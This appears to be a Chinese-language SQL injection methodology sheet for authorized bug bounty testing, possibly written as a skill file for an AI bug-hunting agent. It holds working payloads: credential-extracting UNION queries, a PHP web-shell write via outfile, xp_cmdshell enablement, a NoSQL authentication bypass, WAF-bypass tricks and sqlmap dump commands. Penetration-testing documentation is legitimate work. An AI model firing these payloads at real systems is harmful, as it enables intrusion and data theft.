# SQL 注入（SQLi）

> 把「数据」提升为「SQL 指令」。能拖库 / 读 admin hash 的 SQLi → 高，DBA 权限或 RCE 升级 → 严重。Bug Bounty 中 SQLi 长期霸榜高赏金（Starbucks/Valve 均出现过数万美元级 SQLi）。

**取材来源**：[MyuriKanao/src-hunter-skill](https://github.com/MyuriKanao/src-hunter-skill)（27,732 WooYun 案例提炼）、[elementalsouls/Claude-BugHunter](https://github.com/elementalsouls/Claude-BugHunter)、[SnailSploit/Claude-Red](https://github.com/SnailSploit/Claude-Red)；权威公开源 PayloadsAllTheThings / PortSwigger / HackTricks。

---

## 1. 触发信号

- 用户输入进入 SQL 查询：登录框、搜索框、列表/详情页 `?id=`、排序/筛选参数
- 报错回显数据库信息（`You have an error in your SQL syntax` / `ORA-00942` / `Microsoft OLE DB`）
- 参数加减引号后页面/响应长度/时间出现可复现差异

## 2. 高频入口点

**高频危险参数名**（WooYun 27,732 案例统计，见本地 src-hunter sqli.md §2.1）：

| 类别 | 参数 |
|---|---|
| 数字 ID | `id` `sort_id` `stid` `fid` `hotelid` `page` |
| 认证 | `username` `password` `userpwd` |
| 业务 | `name` `type` `action` `keyword` |
| ASP.NET 特有 | `__viewstate` `__eventvalidation` `__eventargument` `__eventtarget` |

**注入向量分布**（本地 src-hunter WooYun 27,732 案例统计，非官方数据）：登录框 66% / 搜索框 64% / POST 表单 60% / HTTP Header 26%（`User-Agent` `Referer` `X-Forwarded-For`）/ GET 24% / Cookie 12%。

**后端类型快表**：

| 后缀 | 数据库 | 报错关键字 |
|---|---|---|
| `.php` | MySQL | `You have an error in your SQL syntax` |
| `.aspx` | MSSQL/Oracle | `Unclosed quotation mark` / `Microsoft OLE DB` |
| `.asp` | Access/MSSQL | `Microsoft JET Database Engine` |
| `.jsp/.do/.action` | Oracle/MySQL | `ORA-00942` / `SQL exception` |

## 3. 探测顺序（从最无害 → 最有杀伤力）

1. **确认注入点**：`id=1'` `id=1"` `id=1)` 看是否报错/异常；`id=1 AND 1=1`（正常）vs `id=1 AND 1=2`（异常）确认布尔差异；数字型用 `id=2-1` 应等于 `id=1`。
2. **数据库指纹**：`SELECT @@version` / `version()` / `db_name()`；延时函数 `sleep(5)` / `WAITFOR DELAY` / `pg_sleep(5)`。
3. **选技术**：有回显 → 联合查询；有报错 → 报错注入；无回显无报错 → 布尔/时间盲注。
4. **拿最小证据**（3 条样本即止，不 dump 全库）：`version()` + `database()` + 一行 admin 用户名（脱敏）。
5. **评估升级**（仅授权允许时）：FILE 权限读文件 → outfile 写 shell → xp_cmdshell RCE。

## 4. Payload 区（每条标注出处）

### 4.1 基础探测 `[PortSwigger / HackTricks]`

```sql
id=1'                      -- 单引号报错？
id=1"                      -- 双引号
id=1)                      -- 括号
id=1 AND 1=1               -- 正常
id=1 AND 1=2               -- 异常 → 布尔盲
id=1 AND sleep(5)          -- 延时 5s → 时间盲
id=2-1                     -- 数字型验证
```

### 4.2 联合查询（有回显）`[PayloadsAllTheThings]`

```sql
id=1 ORDER BY 1--  ...  ORDER BY N--   -- 报错时 N-1 为列数
id=-1 UNION SELECT 1,2,3,4,5--          -- 定位回显列
id=-1 UNION SELECT 1,database(),version(),user(),5--
id=-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--
id=-1 UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users--
```

### 4.3 报错注入（有报错回显）`[本地 src-hunter]`

```sql
-- MySQL extractvalue / updatexml
id=1 AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))
id=1 AND updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)
-- MSSQL CONVERT
id=1 AND 1=CONVERT(INT,(SELECT @@version))
```

### 4.4 布尔 / 时间盲注 `[PortSwigger]`

```sql
-- 布尔逐字符（二分）
id=1 AND ASCII(SUBSTRING((SELECT database()),1,1))>100
-- 时间盲
id=1 AND IF(1=1,sleep(5),0)                 -- MySQL
id=1; WAITFOR DELAY '0:0:5'--               -- MSSQL
id=1 AND dbms_pipe.receive_message('a',5)=1 -- Oracle
id=1 AND pg_sleep(5)                        -- PostgreSQL
```

### 4.5 各数据库利用链（节选）`[本地 src-hunter]`

**MySQL**：`union select 1,load_file('/etc/passwd'),3--`（FILE 读文件）；`union select 1,'<?php @system($_POST[c]);?>',3 into outfile '/var/www/html/shell.php'--`（写 shell，需 FILE+路径已知）。

**MSSQL**：`; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC master..xp_cmdshell 'whoami'--`（sa 权限 RCE）。

**NoSQL（MongoDB）**：`{"username": {"$ne": ""}, "password": {"$ne": ""}}` 认证绕过；`{"username": {"$regex": "^a"}}` 盲注逐字符 `[HackTricks]`。

### 4.6 Bypass 矩阵 `[本地 src-hunter §4]`

| 维度 | 手法 |
|---|---|
| 关键字 | `UnIoN SeLeCt` 大小写 / `un/**/ion sel/**/ect` / `/*!50000union*//*!50000select*/`（MySQL 内联注释）|
| 空格 | `/**/` / `%09` / `%0a` / 括号 |
| 引号 | `0x...` 十六进制 / `char()` / `%df%27`（GBK 宽字节）|
| 等号 | `LIKE` / `REGEXP` / `IN(1)` / `BETWEEN` |
| 函数 | `mid()/substr()/substring()/left()` 互换 |
| 注释 | `--` / `#` / `/**/` / `;%00` |
| 入口换 | Header / Cookie / `X-Forwarded-For` 注入 |

## 5. 工具用法

```bash
# sqlmap（手工确认后扩大覆盖）
sqlmap -u "https://target/page.php?id=1" --batch
sqlmap -r request.txt --batch                 # 用 Burp 保存的请求
sqlmap -u "..." --dbs                         # 列库
sqlmap -u "..." -D db -T users -C "username,password" --dump --start 1 --stop 3
sqlmap -u "..." --tamper=between,space2comment,charencode   # WAF 绕过
sqlmap -u "..." --technique=B --time-sec=10   # 仅布尔/时间盲，降速
```

> 纪律：`--threads=1 --delay=1` 降速；`--start 1 --stop 3` 只取样本；`--os-shell` 仅授权场景。

## 6. 证据要求

**「已确认」必须满足**：同参数 `sleep(5)` 稳定 5s 延时 + `sleep(0)` 0s，≥5 次可复现；或报错回显数据库信息；或 UNION 回显数据。保存完整 HTTP 请求/响应 + 截图 + 计时数据。

**PoC 模板**：

```http
GET /api/search?keyword=test' AND (SELECT SLEEP(5))-- - HTTP/1.1
Host: target.com
→ 响应时间：5.23s（5/5 复现：5.21/5.18/5.31/5.22/5.19s）
GET /api/search?keyword=test' AND (SELECT SLEEP(0))-- - HTTP/1.1
→ 响应时间：0.09s
```

**CVSS 参考**：未授权可拖库 `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N = 9.1`；仅时间盲 `C:L = 5.3`；SQLi→RCE `= 9.8`。

## 7. 合规边界 / 不要做的事

- **禁**：dump 全表。`--start 1 --stop 3` 取 3 条样本即可。
- **禁**：实际 outfile 写文件 / `xp_cmdshell` 执行命令——「证明能」即可。
- **禁**：堆叠 `DROP` / `DELETE` / `UPDATE`，仅 `SELECT`。
- **禁**：用读到的 hash 离线破解后实际登录目标后台。
- **脱敏**：报告中的 admin 密码 hash 只写前 8 字符 + sha256；PII 只留前 2 + 后 2 字符。
